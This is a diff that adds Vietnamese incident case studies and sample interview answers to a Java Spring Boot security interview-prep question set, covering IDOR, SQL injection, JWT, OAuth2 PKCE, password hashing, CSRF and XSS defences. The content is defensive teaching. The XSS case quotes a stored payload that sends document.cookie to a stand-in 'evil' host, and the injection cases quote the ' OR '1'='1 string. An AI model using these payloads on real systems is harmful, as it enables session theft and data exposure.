@@ -69,6 +69,16 @@ public String encrypt(String plain, SecretKey key) throws GeneralSecurityExcepti
 | JPQL | {{em.createQuery("SELECT u FROM User u WHERE u.email = '" + email + "'")}} | {{em.createQuery("SELECT u FROM User u WHERE u.email = :email").setParameter("email", email)}} |
 | ORDER BY | {{repo.findAll(Sort.by(userInput))}} | {{repo.findAll(Sort.by(whitelist.contains(userInput) ? userInput : "id"))}} |
 
+### Ví dụ đời thực
+- **Triệu chứng**: Đội vận hành của một hệ thống sao kê điện tử (Spring Boot 3, PostgreSQL, ~120k user hoạt động/ngày) phát hiện trong 2 giờ có khoảng 1.800 request {{GET /api/accounts/ID/transactions}} trả 200 nhưng trường {{userId}} trong log truy cập không khớp chủ sở hữu tài khoản; đồng thời WAF ghi nhận nhiều request chỉ khác nhau ở số {{id}} tăng dần từ một IP. Không có SQL lỗi, không có 5xx — đây là dấu hiệu IDOR (truy cập đối tượng không được phép).
+- **Điều tra**: Truy vấn log có correlation id: {{grep transactions access.log | awk print user accountId}} cho thấy cùng {{user=U1024}} đọc được {{accountId}} của người khác. Bật kiểm tra truy vấn: trong service chỉ có {{txnRepo.findByAccountId(accountId)}} mà không xác minh {{currentUserId}}. SonarQube trước đó đã tắt rule kiểm tra quyền theo object vì "false positive"; SpotBugs chưa cài plugin Find Security Bugs.
+- **Nguyên nhân gốc**: Broken Access Control (OWASP A01) — endpoint tin vào {{accountId}} từ path mà không kiểm tra ownership. Dữ liệu nhạy cảm (số dư, lịch sử giao dịch) bị lộ theo chiều ngang (horizontal privilege escalation).
+- **Cách xử lý**: (1) Bổ sung kiểm tra sở hữu trong service: {{accountRepo.existsByIdAndUserId(accountId, SecurityUtil.getCurrentUserId())}} và trả 404 (không trả 403 để tránh lộ sự tồn tại). (2) Thêm {{@PreAuthorize}}/custom {{PermissionEvaluator}} làm lớp thứ hai. (3) Bật static analysis có taint analysis: Find Security Bugs (rule {{IDOR}}/access control), Semgrep hoặc CodeQL — SonarQube rule {{java:S5131}} lại là kiểm tra XSS phản xạ, không phải IDOR, đừng nhầm. (4) Rà soát toàn bộ endpoint dạng {{/resource/ID/...}} — phát hiện thêm 4 endpoint cùng lỗi. (5) Thông báo bảo mật và buộc đăng xuất phiên nghi vấn.
+- **Kết quả đo được**: Sau vá, kiểm thử tự động với 200 ca "user A đọc tài nguyên user B" đều trả 404; không còn request lệch chủ sở hữu trong 30 ngày theo dõi. Pipeline CI chặn được 3 PR mới có mẫu tương tự trong tháng tiếp theo.
+
+### Trả lời mẫu khi phỏng vấn
+"Khi làm backend Java, em ưu tiên chống ba nhóm lỗi OWASP hay gặp nhất. Thứ nhất là Broken Access Control: kể cả đã đăng nhập, mỗi lần truy cập tài nguyên theo id như {{/accounts/ID}} em đều kiểm tra ownership ở service, ví dụ xác minh {{accountId}} thuộc {{currentUserId}} và trả 404 nếu không khớp, có thể thêm {{@PreAuthorize}} làm lớp thứ hai. Thứ hai là Cryptographic Failures: mật khẩu không bao giờ hash nhanh, em dùng {{BCryptPasswordEncoder}} (hoặc Argon2id) vì có salt và cost làm brute-force tốn kém; dữ liệu cần giải mã như số thẻ thì dùng AES-GCM với IV ngẫu nhiên mỗi lần và quản lý key qua KMS/Vault. Thứ ba là Injection: mọi truy vấn đều dùng tham số hoá ({{JdbcTemplate}} dấu hỏi, JPQL {{:param}}, {{CriteriaBuilder}}), không nối chuỗi; với ORDER BY động thì whitelist cột cho phép. Trên production em từng xử lý một ca IDOR đọc lộ sao kê do thiếu kiểm tra sở hữu, nên sau đó em luôn thêm test âm tính và rule SAST trong CI để chặn tái diễn."
+
 > Senior tip: trong code review ngân hàng, **bất kỳ** nối chuỗi vào câu query/JPQL là finding P1. Dùng static analysis có taint analysis: SpotBugs + plugin **Find Security Bugs** (rule {{SQL_INJECTION_JDBC}}, {{SQL_INJECTION_JPA}}), SonarQube rule {{java:S3649}} (SQL injection), hoặc Semgrep/CodeQL, và chặn merge khi có finding.
 
 ### Bảng tóm tắt chặn OWASP Top 10 cho Spring Boot
@@ -180,6 +190,16 @@ Giá trị của annotation phải là hằng compile-time nên không nối bi�
 - **Batch insert**: {{JdbcTemplate.batchUpdate(sql, batchArgs)}} — mỗi {{batchArgs[i]}} là mảng tham số, an toàn.
 - **Stored procedure**: {{CallableStatement}} với {{?}} placeholder cũng an toàn.
 
+### Ví dụ đời thực
+- **Triệu chứng**: Một API tra cứu khách hàng (Spring Boot, Hibernate 6, Oracle) có endpoint {{GET /api/users/search?email=...}} bắt đầu trả về toàn bộ danh sách user (khoảng 45.000 bản ghi) cho một số request bất thường. Trong access log xuất hiện tham số {{email}} chứa ký tự lạ như {{' OR '1'='1}}; tỉ lệ 5xx không tăng, nhưng băng thông outbound tăng gấp 6 lần trong 20 phút và hệ thống cảnh báo rò rỉ dữ liệu.
+- **Điều tra**: Bật log Hibernate SQL ở staging tái hiện: câu JPQL được ghép chuỗi {{createQuery("... WHERE u.email = '" + email + "'")}} sinh ra {{WHERE u.email = '' OR '1'='1'}}, luôn đúng. Kiểm tra codebase bằng {{grep -n 'createQuery("' }} phát hiện 11 chỗ nối chuỗi; rule SonarQube {{java:S3649}} đang ở mức "info" nên không chặn build. Tài khoản DB của ứng dụng còn có quyền {{SELECT ANY TABLE}} (quá rộng).
+- **Nguyên nhân gốc**: SQL/JPQL injection do nối chuỗi input vào truy vấn. ORM (Hibernate) chỉ sinh SQL từ chuỗi được cung cấp, nên không "tự an toàn" nếu lập trình viên concat.
+- **Cách xử lý**: (1) Thay mọi chỗ nối chuỗi bằng tham số hoá: JPQL {{setParameter("email", email)}} hoặc {{CriteriaBuilder}}; native query dùng {{?1}}. (2) Với ORDER BY động, áp dụng whitelist cột/hướng. (3) Thu hẹp quyền DB chỉ còn {{SELECT/INSERT/UPDATE}} trên schema cần thiết. (4) Thêm {{@RestControllerAdvice}} trả lỗi chung, không lộ stack trace/SQL. (5) Nâng rule {{java:S3649}} và Find Security Bugs thành blocker trong CI.
+- **Kết quả đo được**: Test tái hiện với payload {{' OR '1'='1}} trả về 0 hoặc 1 bản ghi đúng ngữ cảnh (không còn dump toàn bảng). 11 điểm nối chuỗi được vá trong 2 ngày; 60 ngày sau không ghi nhận payload injection thành công, và CI chặn thêm 2 PR mới vi phạm.
+
+### Trả lời mẫu khi phỏng vấn
+"Với SQL injection trong Java, em hiểu bản chất là dữ liệu người dùng bị trình thông dịch SQL hiểu như mã. {{PreparedStatement}} an toàn vì nó gửi câu lệnh có placeholder {{?}} và giá trị riêng, driver truyền tham số theo giao thức nên giá trị không bị ghép thành cú pháp. Với JPA/Hibernate thì JPQL/HQL vẫn bị injection nếu mình nối chuỗi, ví dụ {{createQuery("... '" + email + "'")}}; cách đúng là {{setParameter}} hoặc {{CriteriaBuilder}}. Riêng ORDER BY không bind được bằng placeholder vì đó là identifier, nên em dùng whitelist cột và hướng sắp xếp rồi mới ghép. Em cũng lưu ý ORM không tự an toàn, và native query annotation an toàn chỉ khi dùng tham số. Ở một dự án thực tế, team em từng gặp endpoint trả về cả bảng do JPQL nối chuỗi; sau khi tham số hoá, siết quyền DB và bật SonarQube {{S3649}} cùng Find Security Bugs chặn merge, lỗi không tái diễn."
+
 > Senior tip: đừng trả message lỗi SQL/stack trace về client (lộ schema, hỗ trợ error-based injection) — dùng error handler chung. Trong CI, chạy SpotBugs + Find Security Bugs (rule {{SQL_INJECTION_JDBC}}, {{SQL_INJECTION_JPA}}) và SonarQube rule {{java:S3649}}. Tài khoản DB của app chỉ có quyền tối thiểu (không DDL) để giới hạn thiệt hại. Với legacy code dùng {{StringBuilder}} build query, refactor sang {{CriteriaBuilder}} hoặc {{jOOQ}} (type-safe SQL builder).`,
   follow: [
     'Vì sao {{PreparedStatement}} có thể chậm hơn {{Statement}} ở lần đầu, nhưng nhanh hơn ở các lần sau?',
@@ -271,6 +291,16 @@ public TokenPair refresh(RefreshRequest req) {
     return issueNewTokenPair(stored.getUserId(), req.deviceId());
 }
 ~~~
+
+### Ví dụ đời thực
+- **Triệu chứng**: Ứng dụng mobile ngân hàng (backend Spring Boot, 8 microservice, xác thực bằng JWT HS256) nhận khiếu nại: một người dùng báo "đã đổi mật khẩu nhưng thiết bị cũ vẫn chuyển tiền được" trong khoảng 2 giờ. Song song, đội bảo mật phát hiện access token rò rỉ qua log của một service bên thứ ba (token bị ghi đầy đủ trong header).
+- **Điều tra**: Kiểm tra luồng thu hồi: access token sống 2 giờ, không có denylist theo {{jti}}, và khi đổi mật khẩu hệ thống chỉ xóa session web chứ không chặn JWT đã phát. Kiểm tra cấu hình xác thực: một service tự parse JWT mà chỉ kiểm tra chữ ký, bỏ qua {{aud}} và {{iss}}; secret HS256 dùng chung cho tất cả service nên khó xoay khi nghi ngờ lộ.
+- **Nguyên nhân gốc**: Thiết kế JWT thiếu kiểm soát vòng đời — (1) access token quá dài và không có cơ chế thu hồi tức thì, (2) secret đối xứng chia sẻ rộng làm tăng bán kính ảnh hưởng khi lộ, (3) validator thiếu {{iss}}/{{aud}} cho phép token phát cho hệ khác bị chấp nhận nhầm nếu dùng chung key.
+- **Cách xử lý**: (1) Chuyển sang RS256 + JWKS ({{spring.security.oauth2.resourceserver.jwt.jwk-set-uri}}), private key chỉ nằm ở issuer. (2) Rút access token xuống 10 phút; refresh token 7 ngày, one-time use + rotation, phát hiện reuse thì revoke toàn bộ chuỗi. (3) Thêm denylist Redis theo {{jti}} (TTL = {{exp - now}}) để logout/đổi mật khẩu có hiệu lực ngay; kiểm tra signature/exp trước rồi mới tra denylist. (4) Bật validator {{iss}}/{{aud}} và cố định thuật toán chấp nhận, không tin {{alg}} trong header.
+- **Kết quả đo được**: Sau thay đổi, thao tác "đăng xuất tất cả thiết bị" có hiệu lực trong < 10 giây (do access token hết hạn nhanh + denylist). Kịch bản kiểm thử dùng token rò rỉ sau khi revoke bị từ chối 100% (401). Việc xoay key chỉ cần thêm key mới vào JWKS, không cần redeploy các service tiêu thụ.
+
+### Trả lời mẫu khi phỏng vấn
+"Em nhìn JWT như một tấm vé tự chứa ba phần header, payload, signature. Em ưu tiên RS256 khi có nhiều service vì issuer ký bằng private key, còn các service chỉ cần public key từ JWKS để verify, nên không phải chia sẻ secret và xoay key dễ hơn; HS256 chỉ phù hợp hệ nhỏ một bên ký một bên verify. Khi validate, ngoài chữ ký em luôn kiểm tra {{exp}}/{{nbf}} (có clock skew nhỏ), {{iss}}, {{aud}} và cố định thuật toán chấp nhận để tránh algorithm confusion. Thu hồi JWT thuần thì khó, nên em dùng access token ngắn 5–10 phút, refresh token dài hơn nhưng one-time use với rotation và phát hiện reuse để khóa cả chuỗi; với logout hay đổi mật khẩu cần hiệu lực ngay thì thêm denylist {{jti}} trong Redis. Trong một hệ thống em từng gặp token lộ vẫn dùng được sau đổi mật khẩu, và giải pháp là rút TTL, thêm denylist và chuyển sang RS256 + JWKS."
 
 > Senior tip: **luôn dùng RS256 + JWKS** (Spring Boot: {{spring.security.oauth2.resourceserver.jwt.jwk-set-uri}}). Access token 5-10 phút, refresh token 7 ngày + rotation. Lưu {{jti}} vào Redis denylist cho logout tức thì. KHÔNG bỏ kiểm tra {{exp}}/{{iss}}/{{aud}}, và **cố định thuật toán** chấp nhận (không tin {{alg}} trong header). Với ngân hàng: TTL còn ngắn hơn, kèm step-up/MFA cho giao dịch nhạy cảm.`,
   follow: [
@@ -367,6 +397,16 @@ WebClient webClient(OAuth2AuthorizedClientManager manager) { // manager có prov
 - {{nonce}} trong request → {{id_token}} chứa {{nonce}} → **chống replay attack**.
 - {{UserInfo}} endpoint: {{/userinfo}} (cần access token) để lấy thêm claim.
 
+### Ví dụ đời thực
+- **Triệu chứng**: Một SPA (React) tích hợp đăng nhập qua Authorization Server nội bộ. Sau khi phát hành bản mobile-web, bộ phận an ninh phát hiện trong file {{bundle.js}} công khai có {{client_secret}} của OAuth client; đồng thời có vài phiên đăng nhập bất thường: user bị chuyển hướng về trang callback với token của tài khoản khác (dấu hiệu token injection).
+- **Điều tra**: Kiểm tra cấu hình client: SPA đang dùng Authorization Code flow nhưng khai báo là confidential client và nhúng {{client_secret}} trong frontend (ai cũng đọc được). Ở authorization server, client chưa bật PKCE bắt buộc và {{redirect_uri}} chỉ so khớp theo prefix, nên kẻ tấn công có thể lợi dụng redirect linh hoạt. Phân tích phiên lỗi cho thấy callback nhận {{code}} nhưng thiếu kiểm tra {{state}} ở một nhánh code.
+- **Nguyên nhân gốc**: Áp dụng sai OAuth2 cho public client (SPA/mobile) — lộ {{client_secret}}, thiếu PKCE nên {{code}} bị chặn có thể đổi token, và thiếu/không verify {{state}} khiến dễ bị CSRF/login CSRF.
+- **Cách xử lý**: (1) Tạo client mới dạng public: {{client_authentication_method=none}}, bỏ hoàn toàn {{client_secret}} khỏi frontend. (2) Bật Authorization Code + PKCE (S256) và bắt buộc {{requireProofKey}} phía server; chỉ chấp nhận {{redirect_uri}} khớp chính xác. (3) Sinh {{state}} ngẫu nhiên, lưu tạm (session/storage) và verify ở callback; với OIDC thêm {{nonce}} và kiểm tra trong {{id_token}}. (4) Service-to-service chuyển sang Client Credentials với {{private_key_jwt}} hoặc mTLS thay vì shared secret.
+- **Kết quả đo được**: Quét mã nguồn và bundle không còn {{client_secret}}; kiểm thử tự động xác nhận request {{/token}} thiếu {{code_verifier}} bị từ chối, và callback sai {{state}} bị chặn 100%. Không ghi nhận phiên token injection trong 60 ngày sau khi siết {{redirect_uri}} exact match.
+
+### Trả lời mẫu khi phỏng vấn
+"Khi chọn flow OAuth2/OIDC, em quyết định theo loại client. Với SPA hoặc mobile là public client, em dùng Authorization Code + PKCE: client tạo {{code_verifier}} ngẫu nhiên, gửi {{code_challenge=S256}} ở bước authorize, rồi dùng {{verifier}} để đổi {{code}} lấy token, nên kể cả {{code}} bị chặn cũng không đổi được; SPA tuyệt đối không giữ {{client_secret}}. Với service-to-service không có người dùng, em dùng Client Credentials và ưu tiên xác thực client bằng {{private_key_jwt}} hoặc mTLS thay vì secret chia sẻ. Em tránh Implicit flow vì token nằm trên URL fragment, dễ rò rỉ và khó thu hồi an toàn. Khi triển khai em luôn kiểm tra ba điểm: PKCE bắt buộc phía server, {{redirect_uri}} khớp chính xác, và có {{state}} (với OIDC có {{nonce}}) để chống CSRF/replay. Mẫu em hay dùng cho SPA là BFF để token không nằm trong JavaScript, giảm rủi ro nếu bị XSS."
+
 > Senior tip: SPA **không bao giờ** lưu {{client_secret}}. Dùng PKCE + {{client_authentication_method=none}}. Mobile: dùng **AppAuth** library (iOS/Android) hỗ trợ PKCE tự động. Service-to-service: ưu tiên **mTLS + Client Credentials** hoặc **private_key_jwt** thay vì secret. Bắt buộc PKCE phía Auth server (Spring Authorization Server: {{ClientSettings.builder().requireProofKey(true)}}; Keycloak: đặt PKCE method {{S256}} cho client), và chỉ chấp nhận redirect_uri khớp chính xác.`,
   follow: [
     'PKCE {{code_challenge_method=S256}} vs {{plain}} — tại sao {{plain}} không an toàn?',
@@ -397,7 +437,7 @@ WebClient webClient(OAuth2AuthorizedClientManager manager) { // manager có prov
 ~~~text
 $2a$12$AbCdEfGhIjKlMnOpQrStUvWxYz...
 ~~~
-- Giới hạn 72 byte input (UTF-8 — tiếng Việt có dấu tốn 2–3 byte/ký tự). Thuật toán gốc bỏ qua phần thừa; Spring Security các bản vá sau CVE-2025-22228 từ chối input > 72 byte thay vì cắt im lặng.
+- Giới hạn 72 byte input (UTF-8 — tiếng Việt có dấu tốn 2–3 byte/ký tự). Thuật toán gốc bỏ qua phần thừa; Spring Security **từ bản vá CVE-2025-22228 (6.3.8 / 6.4.4 trở lên)** ném {{IllegalArgumentException}} khi input > 72 byte thay vì cắt im lặng — người dùng phải đổi mật khẩu ngắn hơn.
 - Spring: {{new BCryptPasswordEncoder(12)}}.
 
 ~~~java
@@ -442,6 +482,16 @@ $argon2id$v=19$m=65536,t=3,p=4$c2FsdA$hash
 ### Salt — bắt buộc, duy nhất, đủ dài
 - Mỗi user **một salt riêng** (random 16+ byte). Bcrypt/Argon2 tự generate và embed trong hash.
 - **Không** dùng salt chung cho toàn hệ thống — nếu lộ, attacker brute-force song song tất cả user.
+
+### Ví dụ đời thực
+- **Triệu chứng**: Một cổng nội bộ (khoảng 30.000 tài khoản nhân viên, Spring Security) bị rò rỉ bảng {{users}} do một lỗi truy cập dữ liệu không liên quan. Bảng lưu mật khẩu dạng {{SHA-256(password)}} không salt. Trong 48 giờ, đội ứng cứu phát hiện đăng nhập trái phép từ nhiều IP nước ngoài; phân tích cho thấy các mật khẩu phổ biến (ví dụ biến thể của "123456", "Password@123") bị đoán hàng loạt.
+- **Điều tra**: Kiểm tra định dạng cột {{password}}: chuỗi hex 64 ký tự, không có prefix thuật toán, không có salt. Đối chiếu với danh sách mật khẩu rò rỉ công khai: khoảng 18% tài khoản khớp mật khẩu phổ biến khi băm thử bằng GPU (SHA-256 tính rất nhanh). Log ứng dụng còn vô tình ghi một phần payload đăng nhập ở mức DEBUG trong môi trường staging cũ, làm tăng nguy cơ lộ thêm.
+- **Nguyên nhân gốc**: Dùng hàm băm nhanh (SHA-256) cho mật khẩu và không có salt per-user. Băm nhanh cho phép attacker thử hàng tỷ giá trị/giây trên GPU/ASIC; không salt khiến cùng mật khẩu ra cùng hash và tấn công bảng cầu vồng/so khớp hàng loạt hiệu quả.
+- **Cách xử lý**: (1) Chuyển sang {{DelegatingPasswordEncoder}} (ví dụ bcrypt cost 12) để hash mới có prefix chuỗi bcrypt; hash SHA-256 cũ gắn prefix riêng tạm thời để vẫn verify được. (2) Khi user đăng nhập thành công, kiểm tra {{upgradeEncoding()}} và băm lại bằng bcrypt rồi lưu đè. (3) Bắt buộc đổi mật khẩu cho tài khoản có dấu hiệu đăng nhập bất thường; bật rate limit + MFA. (4) Tắt log payload nhạy cảm, rà soát PII/credential trong log.
+- **Kết quả đo được**: Sau 60 ngày, 92% tài khoản chủ động đăng nhập đã được nâng cấp lên bcrypt; các tài khoản còn lại bị ép đổi mật khẩu ở lần đăng nhập kế. Đo trên server production-like: bcrypt cost 12 mất ~250 ms/lần xác thực (chấp nhận được, có rate limit). Không còn ghi nhận đăng nhập hàng loạt từ mật khẩu phổ biến sau khi kết hợp bcrypt + rate limit + MFA.
+
+### Trả lời mẫu khi phỏng vấn
+"Em phân biệt rõ hai nhu cầu: mật khẩu thì phải dùng hàm băm chậm chuyên dụng, còn dữ liệu cần giải mã thì dùng mã hoá. Với mật khẩu, em không dùng SHA-256 vì nó quá nhanh, attacker dùng GPU thử rất nhiều giá trị; thay vào đó em dùng bcrypt hoặc Argon2id vì có salt ngẫu nhiên per-user và tham số làm việc băm tốn kém (bcrypt dùng cost, Argon2id thêm bộ nhớ nên kháng GPU/ASIC tốt hơn). Trong Spring Security em thường chọn {{BCryptPasswordEncoder(12)}} làm mặc định, verify bằng {{matches()}} (so sánh an toàn về thời gian). Để nâng cấp thuật toán, em dùng {{DelegatingPasswordEncoder}} lưu hash kèm prefix và {{upgradeEncoding()}} để rehash khi user đăng nhập. Em cũng không bao giờ log mật khẩu, và luôn kết hợp rate limit/MFA vì hash chậm chỉ bảo vệ khi DB bị lộ chứ không thay thế kiểm soát ở endpoint đăng nhập. Em từng tham gia migrate hệ thống từ SHA-256 sang bcrypt theo cách rolling upgrade như vậy."
 
 > Senior tip: **Mặc định dùng bcrypt cost 12** (đủ an toàn, ít dependency, Spring built-in). Nâng cấp Argon2id khi có team bảo mật dedicated và infra cho phép RAM 64MB/hash. **Không bao giờ** log mật khẩu raw. Dùng {{PasswordEncoder.matches()}} — nó constant-time so sánh (chống timing attack). Kiểm tra {{upgradeEncoding()}} mỗi lần login để nâng cost dần. Dùng {{PasswordEncoderFactories.createDelegatingPasswordEncoder()}} ({{DelegatingPasswordEncoder}}): hash lưu kèm prefix id thuật toán (bcrypt, argon2…) nên có thể đổi thuật toán mà hash cũ vẫn verify được.`,
   follow: [
@@ -533,6 +583,16 @@ SecurityFilterChain webFilterChain(HttpSecurity http) throws Exception {
 }
 ~~~
 
+### Ví dụ đời thực
+- **Triệu chứng**: Một ứng dụng nội bộ quản lý chi phí (Spring Boot + Thymeleaf, đăng nhập bằng session cookie) ghi nhận một số phiếu "duyệt chi" được tạo ngoài ý muốn. User khẳng định không bấm nút; log cho thấy request {{POST /approvals}} hợp lệ, dùng đúng cookie phiên của user, phát sinh ngay sau khi họ mở một email chứa liên kết lạ.
+- **Điều tra**: Tái hiện: trang độc hại dựng một form ẩn auto-submit {{POST /approvals}} tới domain ứng dụng. Vì trình duyệt tự đính kèm cookie session ({{JSESSIONID}} chưa đặt {{SameSite}} rõ ràng, thiếu kiểm tra CSRF), server xử lý như request thật. Kiểm tra cấu hình Spring Security: dự án từng {{csrf.disable()}} khi "làm REST cho nhanh" dù thực tế dùng session cookie.
+- **Nguyên nhân gốc**: CSRF — trình duyệt tự động gửi cookie xác thực trên request cross-site, và server không yêu cầu bằng chứng "người dùng chủ ý gửi từ chính trang này" (CSRF token). SameSite/CORS không được cấu hình đúng, làm tăng bề mặt khai thác.
+- **Cách xử lý**: (1) Bật lại CSRF cho luồng dùng session cookie: {{http.csrf(Customizer.withDefaults())}} với form truyền thống, hoặc {{csrf.spa()}}/{{CookieCsrfTokenRepository}} + handler phù hợp cho SPA. (2) Đặt cookie {{HttpOnly; Secure; SameSite=Lax}} (hoặc Strict nếu phù hợp UX). (3) Với API thuần stateless dùng {{Authorization: Bearer}} (không cookie), xác nhận mới tắt CSRF trên đúng phạm vi đó, tránh tắt toàn cục. (4) Thêm kiểm thử: {{curl -X POST -b cookies.txt}} thiếu token phải trả 403.
+- **Kết quả đo được**: PoC CSRF (form auto-submit từ origin khác) bị chặn với HTTP 403 "Invalid CSRF token". Bộ test tích hợp {{MockMvc}} thêm 12 ca (POST/PUT/DELETE có/không token) đều đạt; sau 90 ngày không phát sinh phiếu duyệt ngoài luồng hợp lệ.
+
+### Trả lời mẫu khi phỏng vấn
+"Em hiểu CSRF là kiểu tấn công lợi dụng việc trình duyệt tự gửi cookie phiên kèm request cross-site, nên server phải phân biệt request do người dùng chủ ý bấm từ request bị trang khác ép gửi. Nếu ứng dụng dùng session cookie, em luôn bật CSRF token trong Spring Security: token gắn với phiên, client gửi lại qua hidden field hoặc header, server kiểm tra mỗi request đổi trạng thái. Cookie cũng cần {{HttpOnly}}, {{Secure}} và {{SameSite}} (thường Lax) như lớp bổ sung. Ngược lại, nếu API thực sự stateless và chỉ nhận JWT qua header {{Authorization: Bearer}}, không dùng cookie, thì không có CSRF theo nghĩa cookie-based, nhưng em vẫn cân nhắc rủi ro XSS khi lưu token ở {{localStorage}} nên đôi khi chọn mô hình BFF + session cookie. Trên production em từng gặp sự cố do {{csrf.disable()}} bị bật nhầm trên app dùng session; sau khi bật lại {{csrf.spa()}} và thêm test {{MockMvc}} cho trường hợp thiếu token, lỗi không lặp lại."
+
 > Senior tip: Bearer token trong header thì không có CSRF, nhưng token nằm trong JS (localStorage) lại dễ bị XSS lấy cắp — vì vậy nhiều hệ thống chọn BFF + session cookie và giữ CSRF token. Với session cookie: set {{SameSite=Lax}} (hoặc {{Strict}}), {{Secure}}, {{HttpOnly}}, và dùng {{csrf.spa()}} / {{CookieCsrfTokenRepository}} + handler phù hợp cho SPA. **Không** tắt CSRF toàn cục ({{csrf.disable()}}) trừ khi chắc chắn stateless. Test bằng {{curl -X POST -b cookies.txt https://api.bank.com/transfer}} — phải bị 403 nếu thiếu token.`,
   follow: [
     'SameSite=Lax cho phép GET cross-site top-level navigation — có nguy hiểm không? Ví dụ thực tế?',
@@ -610,6 +670,12 @@ SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
 - **Nguy hiểm khi**: frontend dùng {{innerHTML}}, {{dangerouslySetInnerHTML}} (React), {{v-html}} (Vue) để render JSON string; hoặc server trả sai Content-Type ({{text/html}}) cho response có echo input → reflected XSS.
 - **JSONP** (callback) — **cấm tuyệt đối**: callback name bị inject thành XSS, và dữ liệu bị đọc cross-site.
 - **Mime sniffing**: set {{X-Content-Type-Options: nosniff}} để browser không guess type.
+
+### Ví dụ đời thực
+Một SPA React của ngân hàng render comment từ DB bằng {{dangerouslySetInnerHTML}} vì "cần giữ định dạng". Attacker lưu comment {{<img src=x onerror=fetch('https://evil/'+document.cookie)>}}. Victim mở trang → script chạy, gửi cookie session. Điều tra: CSP report-only báo violation {{script-src}}, frontend code grep {{dangerouslySetInnerHTML}} → 3 chỗ. Sửa: dùng {{textContent}} + Markdown renderer an toàn ({{DOMPurify}}), CSP enforce với nonce. Sau fix: report-only sạch, pentest không reproduce. Kết quả: zero XSS finding trong audit tiếp theo.
+
+### Trả lời mẫu khi phỏng vấn
+"XSS có 3 loại: Stored lưu payload trong DB, Reflected phản xạ qua URL, DOM-based chỉ chạy client. Phòng thủ chính là output encoding context-aware — HTML body, attribute, JS string, URL mỗi ngữ cảnh encode khác nhau. Thymeleaf {{th:text}} và React JSX tự escape, nên đừng tắt. CSP là lớp 2: nonce cho inline script, {{object-src 'none'}}. API JSON không execute trực tiếp, nhưng frontend render {{innerHTML}} thì vẫn XSS; set {{X-Content-Type-Options: nosniff}} để tránh mime sniffing. JSONP cấm tuyệt đối. Thực tế tôi audit grep {{dangerouslySetInnerHTML}} và {{innerHTML}} trong codebase."
 
 > Senior tip: **Output encoding là bắt buộc**, CSP là lớp 2. Thymeleaf/React default escape — đừng tắt. API JSON: set {{X-Content-Type-Options: nosniff}}, {{Content-Type: application/json; charset=utf-8}}. Frontend: **không bao giờ** {{innerHTML}}/{{dangerouslySetInnerHTML}} dữ liệu user. Dùng {{textContent}}, cú pháp nội suy mặc định của Vue (ngoặc nhọn kép) hay biểu thức JSX của React — đều auto-escape. Audit CSP qua {{securityheaders.com}} — mục tiêu {{A+}}.`,
   follow: [
@@ -715,6 +781,12 @@ static MethodSecurityExpressionHandler methodSecurityExpressionHandler(Permissio
 - **Collection resource**: {{GET /accounts}} — phải filter {{WHERE user_id = ?}}, không trả all rồi filter ở Java.
 - **Admin/Staff**: cần role check riêng ({{hasRole('ADMIN') || @accountSecurity.canAccess(...)}}).
 
+### Ví dụ đời thực
+Hệ thống ngân hàng có endpoint {{/api/v1/accounts/<id>/transactions}}. Attacker đổi {{id}} thành tài khoản người khác và nhận sao kê. Điều tra: controller gọi {{transactionRepo.findByAccountId(id)}} không kiểm tra owner; log cho thấy 200 request với id khác nhau từ cùng IP trong 5 phút. Sửa: thêm {{WHERE account.user_id = :userId}} và deny-by-default. Sau fix: trả 404 cho mọi id không thuộc user, attacker không còn enumerate. Kết quả: pentest không reproduce, log ghi nhận attempt bị từ chối.
+
+### Trả lời mẫu khi phỏng vấn
+"IDOR xảy ra khi API dùng identifier trực tiếp mà không verify ownership. Phòng thủ deny-by-default, check quyền ở service layer, không phải controller. Dùng {{@PreAuthorize}} với custom PermissionEvaluator hoặc query {{WHERE user_id = ?}}. Với ngân hàng, trả 404 thay vì 403 để không lộ sự tồn tại tài khoản, log attempt bị từ chối. existsByIdAndUserId với composite index nhanh, không load entity. Authorization là hai chiều: function-level và object-level, bắt buộc test matrix cả hai trong CI."
+
 > Senior tip: **Luôn check ownership ở service layer** — đây là "single source of truth" cho authorization. {{@PreAuthorize}} là lớp 2 (defense-in-depth). Với ngân hàng: log mọi lần access bị từ chối (dù trả 404 để không lộ sự tồn tại của tài khoản) kèm {{accountId}}, {{userId}}, {{ip}} để detect enumeration attack. Dùng {{existsByIdAndUserId}} (index composite) — nhanh, không load entity.`,
   follow: [
     'Vì sao check ở service layer tốt hơn controller? Internal call scenario?',
@@ -802,6 +874,12 @@ public String hybridEncrypt(String plain, PublicKey rsaPublic) throws GeneralSec
 - **Separation of duties**: Dev không biết production key. CI/CD inject key tại runtime.
 - **Audit log**: mọi key access được log.
 
+### Ví dụ đời thực
+Dữ liệu thẻ lưu trong DB bằng AES-ECB với key hardcode trong config. Attacker dump DB và giải mã ECB (pattern block) để khôi phục PAN. Điều tra: code grep {{Cipher.getInstance("AES")}}; key trong application.yml. Sửa: AES-GCM-256 với IV ngẫu nhiên, key từ Vault, envelope encryption. Sau fix: dump DB không còn pattern, perf overhead ~0.3ms/request. Kết quả: audit pass, không còn finding crypto.
+
+### Trả lời mẫu khi phỏng vấn
+"Encrypt data at rest mặc định AES-GCM-256; asymmetric dùng RSA-2048/3072 hoặc ECC P-256. Không tự implement crypto, dùng javax.crypto, Bouncy Castle hoặc Tink. Key management bằng Vault/KMS bắt buộc production; ngân hàng dùng HSM FIPS 140-3 Level 3 cho master key với key ceremony M-of-N. IV/nonce phải ngẫu nhiên cho mỗi bản mã; không tái sử dụng. Encrypt không thay thế access control — defense in depth."
+
 > Senior tip: **Mặc định AES-GCM-256** cho encrypt data at rest. **RSA-2048/3072 hoặc ECC P-256** cho asymmetric. **Không bao giờ** tự implement crypto — dùng {{javax.crypto}}, Bouncy Castle, Tink (Google). Key management bằng Vault/KMS là bắt buộc production. Với ngân hàng: HSM FIPS 140-3 (hoặc 140-2) Level 3 cho master key, key ceremony M-of-N cho split knowledge.`,
   follow: [
     'Tại sao AES-GCM cần IV ngẫu nhiên mỗi lần? Nếu reuse IV + key thì xảy ra gì?',
@@ -886,6 +964,12 @@ Spring Boot 3.1+ còn có **SSL bundles** ({{spring.ssl.bundle.jks.*}} / {{sprin
 - **Open Banking / PSD2** — partner API bắt buộc mTLS + signing.
 - **Internal microservices** — defense-in-depth, ngăn lateral movement.
 - **IoT/Device** — client cert là identity, không dùng password.
+
+### Ví dụ đời thực
